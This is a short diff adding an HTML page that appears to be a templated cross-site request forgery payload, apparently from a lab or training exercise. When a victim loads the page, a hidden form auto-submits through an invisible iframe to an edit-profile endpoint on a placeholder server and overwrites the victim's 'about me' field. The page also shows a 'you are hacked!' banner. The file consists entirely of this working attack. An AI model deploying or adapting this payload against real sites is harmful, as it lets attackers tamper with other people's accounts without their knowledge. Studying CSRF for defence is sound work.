@@ -1,0 +1,18 @@
+<html>
+  
+<body onload="document.forms[0].submit();">
+  <h1>Check your profile, you are hacked!</h1>
+  
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method="POST" action="http://{server_ip}/edit-profile.php" target="csrf-frame" id="csrf-form">
+  <input type="hidden" name="about_me" value="{about_me}"/>
+  <input type="hidden" name="update" value="Update Profile">
+</form>
+
+</body>
+
+<a href="http://{server_ip}/profile.php">Check profile</a>
+
+</html>
+
+ 
